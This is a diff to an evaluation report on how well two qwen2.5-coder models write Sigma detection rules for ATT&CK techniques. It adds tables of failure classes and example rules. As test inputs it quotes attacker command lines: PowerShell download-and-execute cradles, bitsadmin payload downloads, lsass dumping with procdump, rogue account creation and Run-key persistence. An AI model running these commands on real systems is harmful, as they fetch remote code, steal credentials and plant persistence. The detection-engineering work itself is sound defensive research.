@@ -125,6 +125,491 @@ Every TOO_NARROW rule caught the shown attack line but failed the hidden variant
 5. `PREFIX`: a flag whose prefix (- versus /) differs from the variant and the rule does not use windash.
 6. `OTHER`: any other blocking condition.
 
+### Prompt v3b (Run 20261111_1413, Temp 0.2, 3 Repeats)
+
+#### qwen2.5-coder:7b under prompt v3b (13 TOO_NARROW rules)
+
+| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
+| --- | ---: | ---: | ---: |
+| ALIAS_IMAGE | 3 | 3 | 23.1% |
+| VALUE | 9 | 6 | 69.2% |
+| FLAG_INCIDENTAL | 4 | 4 | 30.8% |
+| ADJACENT | 0 | 0 | 0.0% |
+| PREFIX | 0 | 0 | 0.0% |
+| OTHER | 0 | 0 | 0.0% |
+
+**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1218.011: 3, T1136.001: 3, T1197: 3, T1047: 1
+
+##### Examples by Failure Class
+
+**Class: ALIAS_IMAGE** (1 examples shown):
+
+- Example 1 (T1136.001):
+  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
+  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
+  - Blocking condition: `Image|endswith: \net.exe`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\net.exe'
+        CommandLine|contains|windash: '/add'
+    condition: selection
+```
+
+**Class: VALUE** (3 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -w hidden`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w hidden'
+            - '-c'
+            - 'IEX'
+            - 'DownloadString'
+    condition: selection
+```
+
+- Example 2 (T1218.011):
+  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
+  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
+  - Blocking condition: `CommandLine|contains|all: C:\\Windows\\Temp\\driver.sys`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\rundll32.exe'
+        CommandLine|contains|all:
+            - 'C:\\Windows\\Temp\\driver.sys'
+            - 'Run'
+    condition: selection
+```
+
+- Example 3 (T1218.011):
+  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
+  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
+  - Blocking condition: `CommandLine|contains|all: C:\Windows\Temp\driver.sys`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\rundll32.exe'
+        CommandLine|contains|all:
+            - 'C:\Windows\Temp\driver.sys'
+            - 'Run'
+    condition: selection
+```
+
+**Class: FLAG_INCIDENTAL** (2 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -nop`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w hidden'
+            - '-c'
+            - 'IEX'
+            - 'DownloadString'
+    condition: selection
+```
+
+- Example 2 (T1047):
+  - Shown line: `wmic.exe process call create "cmd.exe /c calc.exe"`
+  - Variant line: `wmic.exe /node:10.0.0.8 process call create "powershell.exe -enc AAAA"`
+  - Blocking condition: `CommandLine|contains|windash: /c`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\wmic.exe'
+        CommandLine|contains|windash: '/c'
+    condition: selection
+```
+
+#### qwen2.5-coder:14b under prompt v3b (9 TOO_NARROW rules)
+
+| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
+| --- | ---: | ---: | ---: |
+| ALIAS_IMAGE | 6 | 6 | 66.7% |
+| VALUE | 3 | 0 | 33.3% |
+| FLAG_INCIDENTAL | 3 | 3 | 33.3% |
+| ADJACENT | 3 | 0 | 33.3% |
+| PREFIX | 0 | 0 | 0.0% |
+| OTHER | 0 | 0 | 0.0% |
+
+**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1136.001: 3, T1003.001: 3
+
+##### Examples by Failure Class
+
+**Class: ALIAS_IMAGE** (2 examples shown):
+
+- Example 1 (T1136.001):
+  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
+  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
+  - Blocking condition: `Image|endswith: \net.exe`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\net.exe'
+        CommandLine|contains|windash: '/add'
+    condition: selection
+```
+
+- Example 2 (T1003.001):
+  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
+  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
+  - Blocking condition: `Image|endswith: \procdump.exe`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\procdump.exe'
+        CommandLine|contains|windash|all:
+            - '-ma'
+            - 'lsass.exe'
+    condition: selection
+```
+
+**Class: VALUE** (1 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -w hidden`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w hidden'
+            - '-c IEX'
+    condition: selection
+```
+
+**Class: FLAG_INCIDENTAL** (1 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -nop`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w hidden'
+            - '-c IEX'
+    condition: selection
+```
+
+**Class: ADJACENT** (1 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -c IEX`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w hidden'
+            - '-c IEX'
+    condition: selection
+```
+
+### Prompt v3a (Run 20261111_1403, Temp 0.2, 3 Repeats)
+
+#### qwen2.5-coder:7b under prompt v3a (20 TOO_NARROW rules)
+
+| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
+| --- | ---: | ---: | ---: |
+| ALIAS_IMAGE | 6 | 6 | 30.0% |
+| VALUE | 14 | 11 | 70.0% |
+| FLAG_INCIDENTAL | 3 | 3 | 15.0% |
+| ADJACENT | 0 | 0 | 0.0% |
+| PREFIX | 0 | 0 | 0.0% |
+| OTHER | 0 | 0 | 0.0% |
+
+**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1218.011: 3, T1053.005: 3, T1547.001: 3, T1136.001: 3
+
+##### Examples by Failure Class
+
+**Class: ALIAS_IMAGE** (2 examples shown):
+
+- Example 1 (T1136.001):
+  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
+  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
+  - Blocking condition: `Image|endswith: \net.exe`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\net.exe'
+        CommandLine|contains|windash|all:
+            - 'user'
+            - '/add'
+    condition: selection
+```
+
+- Example 2 (T1003.001):
+  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
+  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
+  - Blocking condition: `Image|endswith: \procdump.exe`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\procdump.exe'
+        CommandLine|contains|windash|all:
+            - '-ma'
+            - 'lsass.exe'
+    condition: selection
+```
+
+**Class: VALUE** (3 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: hidden`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w'
+            - 'hidden'
+            - '-c'
+            - 'IEX'
+            - '(New-Object Net.WebClient).DownloadString'
+    condition: selection
+```
+
+- Example 2 (T1218.011):
+  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
+  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
+  - Blocking condition: `CommandLine|contains|all: ,Run`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\rundll32.exe'
+        CommandLine|contains|all:
+            - ',Run'
+    condition: selection
+```
+
+- Example 3 (T1218.011):
+  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
+  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
+  - Blocking condition: `CommandLine|contains|all: C:\\Windows\\Temp\\driver.sys`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\rundll32.exe'
+        CommandLine|contains|all:
+            - 'C:\\Windows\\Temp\\driver.sys'
+            - ',Run'
+    condition: selection
+```
+
+**Class: FLAG_INCIDENTAL** (2 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -nop`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w'
+            - 'hidden'
+            - '-c'
+            - 'IEX'
+            - '(New-Object Net.WebClient).DownloadString'
+    condition: selection
+```
+
+- Example 2 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -w`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w'
+            - 'hidden'
+            - '-c'
+            - 'IEX'
+            - '(New-Object Net.WebClient).DownloadString'
+    condition: selection
+```
+
+#### qwen2.5-coder:14b under prompt v3a (16 TOO_NARROW rules)
+
+| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
+| --- | ---: | ---: | ---: |
+| ALIAS_IMAGE | 6 | 6 | 37.5% |
+| VALUE | 10 | 7 | 62.5% |
+| FLAG_INCIDENTAL | 3 | 3 | 18.8% |
+| ADJACENT | 2 | 0 | 12.5% |
+| PREFIX | 0 | 0 | 0.0% |
+| OTHER | 0 | 0 | 0.0% |
+
+**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1547.001: 3, T1136.001: 3, T1003.001: 3, T1197: 2
+
+##### Examples by Failure Class
+
+**Class: ALIAS_IMAGE** (2 examples shown):
+
+- Example 1 (T1136.001):
+  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
+  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
+  - Blocking condition: `Image|endswith: \net.exe`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\net.exe'
+        CommandLine|contains|windash|all:
+            - 'user'
+            - '/add'
+    condition: selection
+```
+
+- Example 2 (T1003.001):
+  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
+  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
+  - Blocking condition: `Image|endswith: \procdump.exe`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\procdump.exe'
+        CommandLine|contains|windash|all:
+            - '-ma'
+            - 'lsass.exe'
+    condition: selection
+```
+
+**Class: VALUE** (3 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -w hidden`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w hidden'
+            - '-c IEX'
+    condition: selection
+```
+
+- Example 2 (T1547.001):
+  - Shown line: `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe`
+  - Variant line: `reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f`
+  - Blocking condition: `CommandLine|contains|windash|all: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\reg.exe'
+        CommandLine|contains|windash|all:
+            - 'add'
+            - 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+    condition: selection
+```
+
+- Example 3 (T1197):
+  - Shown line: `bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\Users\student\evil.dll`
+  - Variant line: `bitsadmin.exe /transfer j2 /download /priority normal https://files.example.net/p.ps1 C:\Users\Public\p.ps1`
+  - Blocking condition: `CommandLine|contains|windash|all: /priority high`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\bitsadmin.exe'
+        CommandLine|contains|windash|all:
+            - '/transfer'
+            - '/download'
+            - '/priority high'
+    condition: selection
+```
+
+**Class: FLAG_INCIDENTAL** (1 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -nop`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w hidden'
+            - '-c IEX'
+    condition: selection
+```
+
+**Class: ADJACENT** (1 examples shown):
+
+- Example 1 (T1059.001):
+  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
+  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
+  - Blocking condition: `CommandLine|contains|windash|all: -c IEX`
+  - Detection block written by model:
+```yaml
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|windash|all:
+            - '-nop'
+            - '-w hidden'
+            - '-c IEX'
+    condition: selection
+```
+
 ### Prompt v2_1 (Frozen Candidates, Run 20261106_1344, Temp 0.2, 3 Repeats)
 
 #### qwen2.5-coder:7b under prompt v2_1 (25 TOO_NARROW rules)
@@ -886,6 +1371,10 @@ Count of TOO_NARROW rules that used the `windash` modifier anywhere in their YAM
 
 | Model | Prompt | Total TOO_NARROW | Uses Windash | Percentage |
 | --- | --- | ---: | ---: | ---: |
+| qwen2.5-coder:7b | v3b | 13 | 7 | 53.8% |
+| qwen2.5-coder:14b | v3b | 9 | 9 | 100.0% |
+| qwen2.5-coder:7b | v3a | 20 | 9 | 45.0% |
+| qwen2.5-coder:14b | v3a | 16 | 16 | 100.0% |
 | qwen2.5-coder:7b | v2_1 | 25 | 12 | 48.0% |
 | qwen2.5-coder:14b | v2_1 | 28 | 16 | 57.1% |
 | qwen2.5-coder:7b | v2 | 27 | 0 | 0.0% |
@@ -899,6 +1388,10 @@ Count of all rules in the run having at least one selection value that starts or
 
 | Model | Prompt | Total Rules | Rules with Padded Value | Percentage |
 | --- | --- | ---: | ---: | ---: |
+| qwen2.5-coder:7b | v3b | 36 | 0 | 0.0% |
+| qwen2.5-coder:14b | v3b | 36 | 0 | 0.0% |
+| qwen2.5-coder:7b | v3a | 36 | 0 | 0.0% |
+| qwen2.5-coder:14b | v3a | 36 | 0 | 0.0% |
 | qwen2.5-coder:7b | v2_1 | 36 | 0 | 0.0% |
 | qwen2.5-coder:14b | v2_1 | 36 | 0 | 0.0% |
 | qwen2.5-coder:7b | v2 | 36 | 3 | 8.3% |
@@ -912,6 +1405,10 @@ Rules that use only an Image check plus a single CommandLine keyword value, and 
 
 | Model | Prompt | Total Rules | Keyword-Only Rules | Strict Passes | Strict Pass Rate |
 | --- | --- | ---: | ---: | ---: | ---: |
+| qwen2.5-coder:7b | v3b | 36 | 15 | 8 | 53.3% |
+| qwen2.5-coder:14b | v3b | 36 | 12 | 9 | 75.0% |
+| qwen2.5-coder:7b | v3a | 36 | 10 | 8 | 80.0% |
+| qwen2.5-coder:14b | v3a | 36 | 9 | 9 | 100.0% |
 | qwen2.5-coder:7b | v2_1 | 36 | 3 | 3 | 100.0% |
 | qwen2.5-coder:14b | v2_1 | 36 | 3 | 3 | 100.0% |
 | qwen2.5-coder:7b | v2 | 36 | 3 | 3 | 100.0% |
